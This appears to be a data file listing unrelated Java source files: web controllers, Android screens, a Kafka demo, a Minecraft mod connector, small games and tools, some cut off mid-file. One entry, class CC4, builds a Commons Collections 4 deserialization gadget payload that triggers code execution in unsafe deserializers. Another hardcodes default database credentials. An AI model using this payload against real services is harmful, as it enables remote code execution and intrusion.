    "package com.managementsystem.employeemanagementwebapp.models;\n\nimport jakarta.persistence.*;\n\n@Entity\n@Table(name=\"employees\")\npublic class Employee {\n    @Id\n    @GeneratedValue(strategy =  GenerationType.IDENTITY)\n    private long id;\n\n    @Column(name = \"first_name\")\n    private String firstName;\n\n    @Column(name = \"last_name\")\n    private String lastName;\n\n    @Column(name = \"email\")\n    private String email;\n    public long getId() {\n        return id;\n    }\n    public void setId(long id) {\n        this.id = id;\n    }\n    public String getFirstName() {\n        return firstName;\n    }\n    public void setFirstName(String firstName) {\n        this.firstName = firstName;\n    }\n    public String getLastName() {\n        return lastName;\n    }\n    public void setLastName(String lastName) {\n        this.lastName = lastName;\n    }\n    public String getEmail() {\n        return email;\n    }\n    public void setEmail(String email) {\n        this.email = email;\n    }\n\n    @Override\n    public String toString() {\n        return \"Employee{\" +\n                \"id=\" + id +\n                \", firstName='\" + firstName + '\\'' +\n                \", lastName='\" + lastName + '\\'' +\n                \", email='\" + email + '\\'' +\n                '}';\n    }\n}\n",
    "package com.bookstore.ai.controllers;\n\nimport org.springframework.ai.chat.ChatResponse;\nimport org.springframework.ai.chat.prompt.Prompt;\nimport org.springframework.ai.chat.prompt.PromptTemplate;\nimport org.springframework.ai.openai.OpenAiChatClient;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\nimport reactor.core.publisher.Flux;\n\n@RestController\n@RequestMapping(\"/bookstore\")\npublic class BookstoreAssistantController {\n\n    private final OpenAiChatClient chatClient;\n\n    public BookstoreAssistantController(OpenAiChatClient chatClient) {\n        this.chatClient = chatClient;\n    }\n\n    @GetMapping(\"/informations\")\n    public String bookstoreChat(@RequestParam(value = \"message\",\n            defaultValue = \"Quais s\u00e3o os livros best sellers dos ultimos anos?\") String message){\n        return chatClient.call(message);\n    }\n\n//    @GetMapping(\"/informations\")\n//    public ChatResponse bookstoreChatEx2(@RequestParam(value = \"message\",\n//            defaultValue = \"Quais s\u00e3o os livros best sellers dos ultimos anos?\") String message){\n//        return chatClient.call(new Prompt(message));\n//    }\n\n    @GetMapping(\"/reviews\")\n    public String bookstoreReview(@RequestParam(value = \"book\", defaultValue = \"Dom Quixote\") String book) {\n        PromptTemplate promptTemplate = new PromptTemplate(\"\"\"\n                  Por favor, me forne\u00e7a\n                  um breve resumo do livro {book}\n                  e tamb\u00e9m a biografia de seu autor.\n                \"\"\");\n        promptTemplate.add(\"book\", book);\n        return this.chatClient.call(promptTemplate.create()).getResult().getOutput().getContent();\n    }\n\n    @GetMapping(\"/stream/informations\")\n    public Flux<String> bookstoreChatStream(@RequestParam(value = \"message\",\n            defaultValue = \"Quais s\u00e3o os livros best sellers dos ultimos anos?\") String message){\n        return chatClient.stream(message);\n    }\n\n//    @GetMapping(\"/stream/informations\")\n//    public Flux<ChatResponse> bookstoreChatStreamEx2(@RequestParam(value = \"message\",\n//            defaultValue = \"Quais s\u00e3o os livros best sellers dos ultimos anos?\") String message){\n//        return chatClient.stream(new Prompt(message));\n//    }\n\n}\n",
    "package com.dhuar.teslaauth;\n\nimport android.content.DialogInterface;\nimport android.os.Bundle;\nimport android.view.Menu;\nimport android.view.MenuItem;\nimport android.view.View;\n\nimport androidx.appcompat.app.AlertDialog;\nimport androidx.appcompat.app.AppCompatActivity;\nimport androidx.navigation.NavController;\nimport androidx.navigation.Navigation;\nimport androidx.navigation.ui.AppBarConfiguration;\nimport androidx.navigation.ui.NavigationUI;\n\nimport com.dhuar.teslaauth.databinding.ActivityMainBinding;\n\n\npublic class MainActivity extends AppCompatActivity {\n\n    private AppBarConfiguration appBarConfiguration;\n    private ActivityMainBinding binding;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        binding = ActivityMainBinding.inflate(getLayoutInflater());\n        setContentView(binding.getRoot());\n\n        setSupportActionBar(binding.toolbar);\n\n        NavController navController = Navigation.findNavController(this, R.id.nav_host_fragment_content_main);\n        appBarConfiguration = new AppBarConfiguration.Builder(navController.getGraph()).build();\n        NavigationUI.setupActionBarWithNavController(this, navController, appBarConfiguration);\n\n        binding.fab.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n//                Snackbar.make(view, \"Replace with your own action\", Snackbar.LENGTH_LONG)\n//                        .setAction(\"Action\", null).show();\n\n\n            }\n        });\n    }\n\n\n\n    @Override\n    public boolean onCreateOptionsMenu(Menu menu) {\n        // Inflate the menu; this adds items to the action bar if it is present.\n        getMenuInflater().inflate(R.menu.menu_main, menu);\n        return true;\n    }\n\n    @Override\n    public boolean onOptionsItemSelected(MenuItem item) {\n        // Handle action bar item clicks here. The action bar will\n        // automatically handle clicks on the Home/Up button, so long\n        // as you specify a parent activity in AndroidManifest.xml.\n        int id = item.getItemId();\n\n        //noinspection SimplifiableIfStatement\n        if (id == R.id.action_sign_in) {\n            Navigation.findNavController(this, R.id.nav_host_fragment_content_main)\n                    .navigate(R.id.action_FirstFragment_to_SecondFragment);\n            return true;\n        } else if(id== R.id.action_about) {\n            AlertDialog.Builder builder = new AlertDialog.Builder(this);\n            builder.setMessage(\"@\u7279\u795e\u5947\")\n                    .setTitle(\"About\");\n            builder.setPositiveButton(\"OK\", new DialogInterface.OnClickListener() {\n                public void onClick(DialogInterface dialog, int id) {\n                    // User taps OK button.\n                }\n            });\n            builder.setNegativeButton(\"cancel\", new DialogInterface.OnClickListener() {\n                public void onClick(DialogInterface dialog, int id) {\n                    // User cancels the dialog.\n                }\n            });\n            AlertDialog dialog = builder.create();\n            dialog.show();\n        }\n\n        return super.onOptionsItemSelected(item);\n    }\n\n    @Override\n    public boolean onSupportNavigateUp() {\n        NavController navController = Navigation.findNavController(this, R.id.nav_host_fragment_content_main);\n        return NavigationUI.navigateUp(navController, appBarConfiguration)\n                || super.onSupportNavigateUp();\n    }\n}",
    "package org.util;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport org.apache.commons.collections4.bag.TreeBag;\nimport org.apache.commons.collections4.comparators.TransformingComparator;\nimport org.apache.commons.collections4.functors.InvokerTransformer;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\n\npublic class CC4 {\n    public static byte[] cc4(String common) throws Exception {\n        TemplatesImpl template = TemplateUtils.getTemplate(common);\n        Constructor<InvokerTransformer> declaredConstructor = InvokerTransformer.class.getDeclaredConstructor(String.class);\n        declaredConstructor.setAccessible(true);\n        InvokerTransformer newTransformer = declaredConstructor.newInstance(\"toString\");\n\n        TransformingComparator tc = new TransformingComparator(newTransformer);\n        TreeBag tb = new TreeBag(tc);\n        tb.add(template);\n\n        Field iMethodName = newTransformer.getClass().getDeclaredField(\"iMethodName\");\n        iMethodName.setAccessible(true);\n        iMethodName.set(newTransformer,\"newTransformer\");\n\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        new ObjectOutputStream(byteArrayOutputStream).writeObject(tb);\n        return byteArrayOutputStream.toByteArray();\n    }\n}\n",
    "/*      Remote player waypoints for Xaero's Map\n        Copyright (C) 2024  Leander Kn\u00fcttel\n\n        This program is free software: you can redistribute it and/or modify\n        it under the terms of the GNU General Public License as published by\n        the Free Software Foundation, either version 3 of the License, or\n        (at your option) any later version.\n\n        This program is distributed in the hope that it will be useful,\n        but WITHOUT ANY WARRANTY; without even the implied warranty of\n        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n        GNU General Public License for more details.\n\n        You should have received a copy of the GNU General Public License\n        along with this program.  If not, see <https://www.gnu.org/licenses/>.*/\n\npackage tbc.remote_player_waypoints_for_xaero.connections;\n\nimport net.minecraft.text.Style;\nimport net.minecraft.text.Text;\nimport net.minecraft.util.Formatting;\nimport tbc.remote_player_waypoints_for_xaero.*;\nimport tbc.remote_player_waypoints_for_xaero.MapUpdates.DynmapUpdate;\nimport tbc.remote_player_waypoints_for_xaero.MapUpdates.SquareMapUpdate;\n\nimport java.io.IOException;\nimport java.net.URL;\nimport java.util.Locale;\n\npublic class SquareMapConnection extends MapConnection {\n    public SquareMapConnection(ModConfig.ServerEntry serverEntry, UpdateTask updateTask) throws IOException {\n        super(serverEntry, updateTask);\n        try {\n            var baseURL = serverEntry.link.toLowerCase(Locale.ROOT);\n            if (!baseURL.startsWith(\"http://\")){\n                baseURL = \"http://\" + baseURL;\n            }\n\n            int i = baseURL.indexOf(\"?\");\n            if (i != -1){\n                baseURL = baseURL.substring(0, i - 1);\n            }\n\n            // Build the url\n            queryURL = new URL(baseURL + \"/tiles/players.json\");\n            RemotePlayerWaypointsForXaero.LOGGER.info(\"new link: \" + queryURL);\n        }\n        catch (Exception e){\n            if (!updateTask.linkBrokenErrorWasShown){\n                updateTask.linkBrokenErrorWasShown = true;\n                mc.inGameHud.getChatHud().addMessage(Text.literal(\"Error: Your Squaremap link is broken!\").setStyle(Style.EMPTY.withColor(Formatting.RED)));\n            }\n            throw e;\n        }\n    }\n\n    @Override\n    public PlayerPosition[] getPlayerPositions(ModConfig config) throws IOException {\n        // Make request for all players\n        SquareMapUpdate update = HTTP.makeJSONHTTPRequest(queryURL, SquareMapUpdate.class);\n\n        // Build a list of positions\n        PlayerPosition[] positions = new PlayerPosition[update.players.length];\n        for (int i = 0; i < update.players.length; i++){\n            SquareMapUpdate.Player player = update.players[i];\n            positions[i] = new PlayerPosition(player.name, player.x, config.general.defaultY, player.z, player.world);\n        }\n\n        return HandlePlayerPositions(positions, config);\n    }\n}\n",
    "package com.mojang.realmsclient.dto;\n\nimport com.google.gson.JsonObject;\nimport com.google.gson.JsonParser;\nimport com.mojang.realmsclient.util.JsonUtils;\nimport org.apache.logging.log4j.LogManager;\nimport org.apache.logging.log4j.Logger;\n\npublic class WorldDownload extends ValueObject\n{\n    private static final Logger field_230646_d_ = LogManager.getLogger();\n    public String field_230643_a_;\n    public String field_230644_b_;\n    public String field_230645_c_;\n\n    public static WorldDownload func_230802_a_(String p_230802_0_)\n    {\n        JsonParser jsonparser = new JsonParser();\n        JsonObject jsonobject = jsonparser.parse(p_230802_0_).getAsJsonObject();\n        WorldDownload worlddownload = new WorldDownload();\n\n        try\n        {\n            worlddownload.field_230643_a_ = JsonUtils.func_225171_a(\"downloadLink\", jsonobject, \"\");\n            worlddownload.field_230644_b_ = JsonUtils.func_225171_a(\"resourcePackUrl\", jsonobject, \"\");\n            worlddownload.field_230645_c_ = JsonUtils.func_225171_a(\"resourcePackHash\", jsonobject, \"\");\n        }\n        catch (Exception exception)\n        {\n            field_230646_d_.error(\"Could not parse WorldDownload: \" + exception.getMessage());\n        }\n\n        return worlddownload;\n    }\n}\n",
    "package app4;\n\nimport java.util.Collections;\n\nimport com.github.javafaker.Book;\nimport com.github.javafaker.Faker;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.common.serialization.LongSerializer;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Lazy;\nimport org.springframework.kafka.annotation.KafkaListener;\nimport org.springframework.kafka.config.TopicBuilder;\nimport org.springframework.kafka.core.KafkaTemplate;\nimport org.springframework.kafka.core.ProducerFactory;\nimport org.springframework.kafka.listener.DeadLetterPublishingRecoverer;\nimport org.springframework.kafka.listener.DefaultErrorHandler;\nimport org.springframework.kafka.support.KafkaHeaders;\nimport org.springframework.messaging.handler.annotation.Header;\nimport org.springframework.stereotype.Component;\nimport org.springframework.util.backoff.FixedBackOff;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\n@SpringBootApplication\npublic class SpringKafkaApp4 {\n\n\tprivate static final Logger logger = LoggerFactory.getLogger(SpringKafkaApp4.class);\n\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(SpringKafkaApp4.class, args);\n\t}\n\n\t@RestController\n\tstatic class Controller {\n\n\t\tFaker faker = Faker.instance();\n\n\t\t@Autowired @Lazy KafkaTemplate<Long, String> longStringKafkaTemplate;\n\n\t\t@PostMapping(path = \"/publish/demo\")\n\t\tpublic void publishDemo() {\n\t\t\tfinal Book book = faker.book();\n\t\t\tfor (int i = 0; i < 10; i++) {\n\t\t\t\tlongStringKafkaTemplate.send(\"spring-kafka-app4-demo\", faker.random().nextLong(),\n\t\t\t\t\t\tString.join(\", \", book.title(), book.author(), book.genre(), book.publisher()));\n\t\t\t}\n\t\t}\n\n\t\t@Bean\n\t\tpublic KafkaTemplate<Long, String> longStringKafkaTemplate(ProducerFactory<Long, String> pf) {\n\t\t\treturn new KafkaTemplate<>(pf,\n\t\t\t\t\tCollections.singletonMap(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, LongSerializer.class));\n\t\t}\n\t}\n\n\tstatic class Admin {\n\n\t\t@Bean\n\t\tpublic NewTopic springKafkaApp4DemoTopic() {\n\t\t\treturn TopicBuilder.name(\"spring-kafka-app4-demo\")\n\t\t\t\t\t.partitions(1)\n\t\t\t\t\t.replicas(3)\n\t\t\t\t\t.build();\n\t\t}\n\n\t\t@Bean\n\t\tpublic NewTopic springKafkaApp4DemoDltTopic() {\n\t\t\treturn TopicBuilder.name(\"spring-kafka-app4-demo.DLT\")\n\t\t\t\t\t.partitions(1)\n\t\t\t\t\t.replicas(3)\n\t\t\t\t\t.build();\n\t\t}\n\n\t}\n\n\t@Component\n\tstatic class Listener {\n\n\t\t@KafkaListener(id = \"sk-app4-demo-group\", topics = \"spring-kafka-app4-demo\",\n\t\t\t\t \t\tproperties = \"key.deserializer:org.apache.kafka.common.serialization.LongDeserializer\")\n\t\tpublic void listen(String in, @Header(KafkaHeaders.RECEIVED_KEY) Long key,\n\t\t\t\t\t\t   @Header(KafkaHeaders.RECEIVED_PARTITION) int partition,\n\t\t\t\t\t\t   @Header(KafkaHeaders.OFFSET) int offset) {\n\t\t\tlogger.info(\"Data Received : {} with key {} from partition {} and offset {}.\", in, key, partition, offset);\n\t\t\tif (offset > 0 && offset % 9 == 0) {\n\t\t\t\tthrow new RuntimeException(\"fail\");\n\t\t\t}\n\t\t}\n\n\t\t@Bean\n\t\tpublic DefaultErrorHandler errorHandler(DeadLetterPublishingRecoverer recoverer) {\n\t\t\treturn new DefaultErrorHandler(recoverer, new FixedBackOff(2_000, 2));\n\t\t}\n\n\t\t@Bean\n\t\tpublic DeadLetterPublishingRecoverer publisher(KafkaTemplate<Long, String> template) {\n\t\t\treturn new DeadLetterPublishingRecoverer(template);\n\t\t}\n\n\t\t@KafkaListener(id = \"from.dlt\", topics = \"spring-kafka-app4-demo.DLT\",\n\t\t\t\tproperties = \"key.deserializer:org.apache.kafka.common.serialization.LongDeserializer\")\n\t\tpublic void listenFromDlt(String in, @Header(KafkaHeaders.RECEIVED_KEY) Long key,\n\t\t\t\t\t\t   @Header(KafkaHeaders.RECEIVED_PARTITION) int partition,\n\t\t\t\t\t\t   @Header(KafkaHeaders.OFFSET) int offset) {\n\t\t\tlogger.info(\"DLT Data Received : {} with key {} from partition {} and offset {}.\", in, key, partition, offset);\n\t\t}\n\n\t}\n}\n",
    "package bootiful.spel;\n\nimport org.junit.jupiter.api.Assertions;\nimport org.junit.jupiter.api.Test;\nimport org.junit.platform.commons.util.ReflectionUtils;\nimport org.springframework.expression.spel.SpelCompilerMode;\nimport org.springframework.expression.spel.SpelParserConfiguration;\nimport org.springframework.expression.spel.standard.SpelExpression;\nimport org.springframework.expression.spel.standard.SpelExpressionParser;\n\nimport java.util.ArrayList;\nimport java.util.Map;\n\nimport static bootiful.spel.Spel.TESLA;\n\nclass CompilationTest {\n\n    @Test\n    void compiled() throws Exception {\n        Assertions.assertTrue(compilationMode(SpelCompilerMode.OFF, \"name\"));\n        Assertions.assertFalse(compilationMode(SpelCompilerMode.IMMEDIATE, \"nationality\"));\n    }\n\n    private long stopwatch(Runnable runnable) {\n        var start = System.nanoTime();\n        runnable.run();\n        var stop = System.nanoTime();\n        return stop - start;\n    }\n\n    private boolean compilationMode(SpelCompilerMode compilerMode, String property) throws Exception {\n        var config = new SpelParserConfiguration(compilerMode, getClass().getClassLoader());\n        var parser = new SpelExpressionParser(config);\n        var expr = parser.parseExpression(property);\n        var runnable = (Runnable) () -> Assertions.assertNotNull(expr.getValue(TESLA));\n        var first = stopwatch(runnable);\n        var maxRuns = 1000;\n        var collection = new ArrayList<Long>();\n        for (var i = 0; i < maxRuns; i++)\n            collection.add(this.stopwatch(runnable));\n        var avg = collection.stream()\n                .mapToLong(value -> value)\n                .summaryStatistics()\n                .getAverage();\n        var improvement = first / avg;\n        Assertions.assertTrue(avg < first, \"the subsequent runs should be much faster than the first run\");\n        System.out.println(Map.of(\"first\", first, \"subsequent\", avg, \"compilerMode\", compilerMode.toString(),\n                \"improvement factor\", improvement));\n\n        var field = SpelExpression.class.getDeclaredField(\"compiledAst\");\n        ReflectionUtils.makeAccessible(field);\n        var compiledAst = field.get(expr);\n        return null == compiledAst;\n\n    }\n\n}\n",
    "package app;\n\nimport app.config.ThymeleafConfig;\nimport app.controllers.OrderController;\nimport app.controllers.UserController;\nimport app.persistence.ConnectionPool;\nimport io.javalin.Javalin;\nimport io.javalin.rendering.template.JavalinThymeleaf;\n\npublic class Main {\n\n    private static final String USER = \"postgres\";\n    private static final String PASSWORD = \"postgres\";\n    private static final String URL = \"jdbc:postgresql://localhost:5432/%s?currentSchema=public\";\n    private static final String DB = \"cupcake\";\n    private static final ConnectionPool connectionPool = ConnectionPool.getInstance(USER, PASSWORD, URL, DB);\n\n    public static void main(String[] args) {\n\n        // Initializing Javalin and Jetty webserver\n        Javalin app = Javalin.create(config -> {\n            config.staticFiles.add(\"/public\");\n            config.fileRenderer(new JavalinThymeleaf(ThymeleafConfig.templateEngine()));\n        }).start(7070);\n\n        // Routing\n        app.get(\"/\", ctx ->  ctx.render(\"login\"));\n\n        UserController.addRoute(app, connectionPool);\n        OrderController.addRoutes(app, connectionPool);\n    }\n}\n",
    "///usr/bin/env jbang \"$0\" \"$@\" ; exit $?\n\n//JAVA 21+\n\n//DEPS com.h2database:h2-mvstore:2.2.224\n//DEPS org.eclipse.jgit:org.eclipse.jgit:6.9.0.202403050737-r\n//DEPS org.kohsuke:github-api:1.321\n//DEPS info.picocli:picocli:4.7.5\n//DEPS one.util:streamex:0.8.2\n//DEPS me.tongfei:progressbar:0.10.1\n//DEPS org.eclipse.collections:eclipse-collections:11.1.0\n\n//DEPS org.tinylog:tinylog-api:2.7.0\n//DEPS org.tinylog:tinylog-impl:2.7.0\n//DEPS org.tinylog:slf4j-tinylog:2.7.0 // because of jgit\n//FILES tinylog.properties\n\nimport java.io.IOException;\nimport java.io.Serializable;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.time.Duration;\nimport java.time.Instant;\nimport java.time.format.DateTimeFormatter;\nimport java.util.Comparator;\nimport java.util.HashSet;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Optional;\nimport java.util.Set;\nimport java.util.SortedSet;\nimport java.util.TreeSet;\nimport java.util.concurrent.Callable;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\nimport java.util.stream.Collectors;\n\nimport me.tongfei.progressbar.ProgressBar;\nimport one.util.streamex.StreamEx;\nimport org.eclipse.collections.api.multimap.MutableMultimap;\nimport org.eclipse.collections.impl.factory.Multimaps;\nimport org.tinylog.Logger;\n\nimport org.eclipse.jgit.api.Git;\nimport org.eclipse.jgit.lib.Repository;\nimport org.eclipse.jgit.revwalk.RevCommit;\nimport org.eclipse.jgit.revwalk.RevWalk;\nimport org.h2.mvstore.MVMap;\nimport org.h2.mvstore.MVStore;\nimport org.kohsuke.github.GHPullRequest;\nimport org.kohsuke.github.GHPullRequestCommitDetail;\nimport org.kohsuke.github.GHRepository;\nimport org.kohsuke.github.GHUser;\nimport org.kohsuke.github.GitHub;\nimport org.kohsuke.github.PagedIterator;\nimport org.kohsuke.github.PagedSearchIterable;\n\nimport picocli.CommandLine;\nimport picocli.CommandLine.Command;\nimport picocli.CommandLine.Option;\nimport picocli.CommandLine.Parameters;\n\n@Command(name = \"gcl\",\n        version = \"gcl 0.1.0\",\n        mixinStandardHelpOptions = true,\n        sortSynopsis = false)\npublic class gcl implements Callable<Integer> {\n\n    @Parameters(index = \"0\", description = \"The path to the git repository to analyse.\")\n    private Path repositoryPath;\n\n    @Option(names = \"--startrevision\", description = \"The first revision to check (tag or commit id). Excluded.\")\n    private String startCommitRevStr = \"v5.12\";\n\n    @Option(names = \"--endrevision\", description = \"The last revision to check (tag or commit id). Included.\")\n    private String endCommitRevStr = \"v5.13\";\n\n    @Option(names = \"--owner\", description = \"The GitHub owner of the repository\")\n    private String owner = \"JabRef\";\n\n    @Option(names = \"--repo\", description = \"The GitHub repository name\")\n    private String repository = \"jabref\";\n\n    @Option(names = \"--cols\", description = \"Number of columns\")\n    private Integer cols  = 6;\n\n    @Option(names = \"--filter\")\n    private List<String> ignoredUsers = List.of(\"koppor\", \"calixtus\", \"Siedlerchr\", \"tobiasdiez\", \"but\", \"k3KAW8Pnf7mkmdSMPHz27\", \"HoussemNasri\", \"dependabot[bot]\", \"dependabot\", \"apps/dependabot\", \"apps/githubactions\", \"ThiloteE\");\n\n    @Option(names = \"--filter-emails\")\n    private List<String> ignoredEmails = List.of(\n            \"118344674+github-merge-queue@users.noreply.github.com\", \"github-merge-queue@users.noreply.github.com\", \"gradle-update-robot@regolo.cc\", \"team@moderne.io\", \"49699333+dependabot[bot]@users.noreply.github.com\",\n            \"houssemnasri2001@gmail.com\", \"cc.snethlage@gmail.com\", \"50491877+calixtus@users.noreply.github.com\", \"siedlerkiller@gmail.com\", \"Siedlerchr@users.noreply.github.com\", \"320228+Siedlerchr@users.noreply.github.com\");\n\n    @Option(names = { \"-l\", \"--github-lookup\" }, description = \"Should calls be made to GitHub's API for user information\", negatable = true)\n    boolean ghLookup = true;\n\n    @Option(names = {\"-m\", \"--lgin-mapping\"}, description = {\"Mapping of GitHub logins to names. Format: name=login\"})\n    Map<String, String> loginMapping = Map.of(\"shawn.jj\", \"shawn-jj\",\n            \"Harshit.Gupta7\", \"harsh1898\",\n            \"Ramandeep Singh\", \"rdsingh13\",\n            \"luklehnert\", \"lwlR\",\n            \"Filippa Nilsson\", \"filippanilsson\",\n            \"Houssem Nasri\", \"HoussemNasri\",\n            \"Anish.Pal\", \"pal-anish\");\n\n    private static final String avatarImgWidth = \"117\";\n\n    private static final String githubUsersEmailSuffix = \"@users.noreply.github.com\";\n\n    private record Contributor(String name, String url, String avatarUrl) implements Serializable {\n    }\n\n    private record CoAuthor(String name, String email) {\n        public CoAuthor(String line) {\n            this(line.substring(\"Co-authored-by: \".length(), line.indexOf('<')).trim(),\n                    line.substring(line.indexOf('<') + 1, line.indexOf('>')).trim());\n            Logger.trace(\"Parsed \\\"{}\\\" into {}\", line, this);\n        }\n    }\n\n    private SortedSet<Contributor> contributors = new TreeSet<>((",
    "import java.io.*;\n\npublic class EasyLevel extends SnakeGame {\n\n    EasyLevel(int boardWidth, int boardHeight, int selectedFood) {\n        super(boardWidth, boardHeight, selectedFood);\n\n        loadBestScore();\n        addObstacles();\n        placeFood(selectedFood);\n    }\n\n    private void loadBestScore() {\n        try {\n            File file = new File(\"easy_level_best_score.txt\");\n            if (file.exists()) {\n                BufferedReader br = new BufferedReader(new FileReader(file));\n                String line = br.readLine();\n                if (line != null) {\n                    bestScore = Integer.parseInt(line);\n                }\n                br.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void updateBestScore() {\n        super.updateBestScore();\n        try {\n            File file = new File(\"easy_level_best_score.txt\");\n            BufferedWriter writer = new BufferedWriter(new FileWriter(file));\n            writer.write(String.valueOf(bestScore));\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void addObstacles() {\n    }\n}\n",
    "package my.project.moviesbox.cling.adapter;\n\nimport android.content.Context;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.ArrayAdapter;\nimport android.widget.TextView;\n\nimport org.fourthline.cling.model.meta.Device;\n\nimport my.project.moviesbox.R;\nimport my.project.moviesbox.cling.entity.ClingDevice;\n\n/**\n * \u8bf4\u660e\uff1a\n * \u4f5c\u8005\uff1azhouzhan\n * \u65e5\u671f\uff1a17/6/28 15:50\n */\n\npublic class DevicesAdapter extends ArrayAdapter<ClingDevice> {\n    private Context context;\n    private LayoutInflater mInflater;\n\n    public DevicesAdapter(Context context) {\n        super(context, 0);\n        this.context = context;\n        mInflater = (LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);\n    }\n\n    @Override\n    public View getView(int position, View convertView, ViewGroup parent) {\n        if (convertView == null)\n            convertView = mInflater.inflate(R.layout.item_device, null);\n        ClingDevice item = getItem(position);\n        if (item == null || item.getDevice() == null) {\n            return convertView;\n        }\n        Device device = item.getDevice();\n        TextView textView = convertView.findViewById(R.id.title);\n        textView.setText(device.getDetails().getFriendlyName());\n        return convertView;\n    }\n}",
    "\r\nimport javax.swing.*;\r\nimport java.awt.*;\r\nimport java.awt.event.ActionEvent;\r\nimport java.awt.event.ActionListener;\r\nimport java.util.ArrayList;\r\nimport java.io.File;\r\nimport java.io.FileWriter;\r\nimport java.io.IOException;\r\nimport java.text.SimpleDateFormat;\r\nimport java.util.Date;\r\n\r\npublic class GPACalculator extends JFrame {\r\n    private JPanel mainPanel,headingpanel,buttonPanel;\r\n    private JTextField nameField, semesterField;\r\n    private JComboBox<Integer> totalCoursesComboBox;\r\n    private JButton calculateButton;\r\n\r\n    private JLabel headinglbl;\r\n    private ArrayList<JTextField>courseNameFields;\r\n    private ArrayList<JComboBox<String>> gradeComboBoxes;\r\n    private ArrayList<JComboBox<Integer>> creditHoursComboBoxes;\r\n    private JPanel coursesPanel;\r\n    private static final String[] GRADES =       {\"A\", \"A-\", \"B+\", \"B\", \"B-\", \"C+\", \"C\", \"C-\", \"D\", \"F\"};\r\n    private static final Double[] GRADE_POINTS = {4.0, 3.66, 3.33, 3.0, 2.66, 2.33, 2.0, 1.66, 1.0, 0.0};\r\n\r\n    public GPACalculator() {\r\n        setTitle(\"GPA Calculator\");\r\n        setSize(500, 600);\r\n        setResizable(false);\r\n        setDefaultCloseOperation(EXIT_ON_CLOSE);\r\n        initUI();\r\n    }\r\n\r\n    private void initUI() {\r\n        mainPanel = new JPanel();\r\n        mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));\r\n\r\n        JPanel topPanel = new JPanel(new FlowLayout());\r\n        topPanel.setBackground(Color.LIGHT_GRAY);\r\n        getContentPane().setBackground(Color.GREEN);\r\n        nameField = new JTextField(10);\r\n        semesterField = new JTextField(10);\r\n        topPanel.add(new JLabel(\"Name:\"));\r\n        topPanel.add(nameField);\r\n        topPanel.add(new JLabel(\"Semester:\"));\r\n        topPanel.add(semesterField);\r\n\r\n        JPanel courseSelectionPanel = new JPanel(new FlowLayout());\r\n        courseSelectionPanel.setBackground(Color.LIGHT_GRAY);\r\n        totalCoursesComboBox = new JComboBox<>();\r\n        for (int i = 1; i <= 10; i++) {\r\n            totalCoursesComboBox.addItem(i);\r\n        }\r\n        totalCoursesComboBox.setSelectedIndex(4); // Default to 5 courses\r\n        totalCoursesComboBox.addActionListener(e -> updateCoursesPanel((int) totalCoursesComboBox.getSelectedItem()));\r\n        courseSelectionPanel.add(new JLabel(\"Total Courses:\"));\r\n        courseSelectionPanel.add(totalCoursesComboBox);\r\n\r\n        coursesPanel = new JPanel();\r\n        coursesPanel.setLayout(new BoxLayout(coursesPanel, BoxLayout.Y_AXIS));\r\n        coursesPanel.setBackground(Color.darkGray);\r\n        updateCoursesPanel(5); // Initialize with 5 courses\r\n\r\n        headinglbl = new JLabel(\"Welcome to GPA Calculator\");\r\n        headinglbl.setBackground(Color.GRAY);\r\n        headinglbl.setForeground(Color.green);\r\n        headinglbl.setFont(new Font(\"consolas\",Font.BOLD,20));\r\n        calculateButton = new JButton(\"Calculate GPA\");\r\n        calculateButton.setBackground(Color.GREEN);\r\n        calculateButton.setHorizontalAlignment(SwingConstants.CENTER);\r\n        calculateButton.addActionListener(new ActionListener() {\r\n            @Override\r\n            public void actionPerformed(ActionEvent e) {\r\n                calculateGPA();\r\n            }\r\n        });\r\n\r\n        headingpanel = new JPanel();\r\n        headingpanel.setLayout(new FlowLayout(FlowLayout.CENTER,0,5));\r\n        headingpanel.add(headinglbl);\r\n        mainPanel.add(headingpanel);\r\n        buttonPanel= new JPanel();\r\n        buttonPanel.setLayout(new FlowLayout(FlowLayout.CENTER,0,5));\r\n        Dimension buttonSize = new Dimension(150,40);\r\n        calculateButton.setPreferredSize(buttonSize);\r\n        calculateButton.setMaximumSize(buttonSize);\r\n        calculateButton.setMinimumSize(buttonSize);\r\n        buttonPanel.add(calculateButton);\r\n        mainPanel.add(topPanel);\r\n        mainPanel.add(courseSelectionPanel);\r\n        mainPanel.add(new JScrollPane(coursesPanel));\r\n        mainPanel.add(buttonPanel);\r\n//        mainPanel.add(calculateButton);\r\n        add(mainPanel);\r\n    }\r\n\r\n    private void updateCoursesPanel(int totalCourses) {\r\n        coursesPanel.removeAll();\r\n        gradeComboBoxes = new ArrayList<>();\r\n        creditHoursComboBoxes = new ArrayList<>();\r\n        